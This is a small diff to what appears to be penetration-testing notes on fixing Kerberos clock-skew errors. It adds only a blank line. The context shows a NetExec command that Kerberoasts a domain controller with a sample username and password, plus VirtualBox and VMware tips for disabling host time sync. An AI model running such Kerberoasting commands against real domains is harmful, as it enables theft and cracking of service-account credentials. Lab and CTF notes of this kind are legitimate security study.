@@ -15,5 +15,6 @@ You can recognize this problem when you see "KRB_AP_ERR_SKEW".
 `sudo rdate -n 10.10.11.100 ; nxc ldap 10.10.11.100 -u 'john.smith' -p 'superpass123' --kerberoasting outputfile`
 
 IMPORTAN NOTE: When operating from a VM, will automaticly sync again with the host unles you change internal settings.
+
 Virtual Box -> `"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" setextradata "<your machine name>" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" "1"`
 VM Ware -> Modify .vmx file.
